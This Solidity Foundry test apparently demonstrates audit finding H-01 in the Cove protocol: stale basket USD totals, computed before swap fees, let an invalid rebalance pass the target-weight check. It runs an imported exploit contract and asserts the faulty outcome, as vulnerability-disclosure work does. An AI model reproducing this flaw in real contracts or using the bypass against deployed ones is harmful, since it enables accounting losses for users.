// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, BasketManagerUtils, MiniToken} from "./57953-h-01-incorrect-basket-usd-value-will-cause-incorrect-results.sol";

// Cove H-01 (finding 57953): `totalValues` is populated before `_processInternalTrades`,
// which charges swap fees that lower each basket's USD value, but `totalValues` is never
// updated. `_isTargetWeightMet` then divides post-fee balances by the stale (too-high)
// denominator, so a rebalance whose true weights breach _MAX_WEIGHT_DEVIATION is accepted.
contract Finding57953Test is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_exploit_staleTotalValues_acceptsInvalidRebalance() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("metStale (vulnerable)", e.metStale() ? 1 : 0);
        emit log_named_uint("metCorrected (fee-adjusted)", e.metCorrected() ? 1 : 0);
        emit log_named_uint("total swap fees (unaccounted USD)", e.totalFees());
        emit log_named_uint("fromBasket USD drift", e.basketDrift());
        emit log_named_uint("drift minted to SINK", e.marker().balanceOf(SINK));

        // The stale-denominator check wrongly reports "target weights met"...
        assertTrue(e.metStale(), "stale check should report met");
        // ...while the fee-corrected check on the SAME balances reports "not met".
        assertFalse(e.metCorrected(), "fee-corrected check should report not met");

        // Quantified accounting harm: the unaccounted USD (total swap fees) is
        // recorded at the SINK marker.
        assertEq(e.totalFees(), 10e18, "total swap fees");
        assertEq(e.marker().balanceOf(SINK), 10e18, "drift recorded at sink");
    }
}
